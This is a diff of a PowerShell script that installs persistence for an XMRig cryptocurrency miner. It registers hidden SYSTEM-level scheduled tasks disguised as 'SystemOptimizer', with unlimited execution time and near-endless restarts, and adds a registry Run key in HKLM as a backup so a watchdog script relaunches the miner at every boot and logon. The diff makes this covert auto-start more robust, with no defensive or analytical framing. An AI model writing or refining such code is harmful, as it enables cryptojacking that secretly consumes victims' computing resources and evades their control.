@@ -125,21 +125,19 @@ Loop
 '@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
 $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 
-# ===== SCHEDULED TASK (SYSTEM, boot + logon, robust quoting) =====
+# ===== SCHEDULED TASK + REGISTRY RUN KEY (redundant auto-start) =====
 $taskName = "SystemOptimizer"
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogPath`""
+$wdPath = "$baseDir\watchdog.vbs"
+# Scheduled task via Register-ScheduledTask (SYSTEM, boot + logon)
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$wdPath`""
 $trigger1 = New-ScheduledTaskTrigger -AtStartup
 $trigger2 = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 Register-ScheduledTask -TaskName "$taskName-Logon" -Action $action -Trigger $trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-
-# ===== REGISTRY RUN KEY BACKUP (HKLM, survives if task fails) =====
-try {
-    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name "SystemOptimizer" -Value "wscript.exe `"`"$watchdogPath`""`"" -Force -ErrorAction SilentlyContinue
-} catch { }
+# Registry Run key backup (HKLM, uses Set-ItemProperty for correct quoting)
+try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"`"$wdPath`""`"" -Force -ErrorAction SilentlyContinue } catch { }
 
 # ===== START WATCHDOG NOW (hidden) =====
 $wshell = New-Object -ComObject WScript.Shell
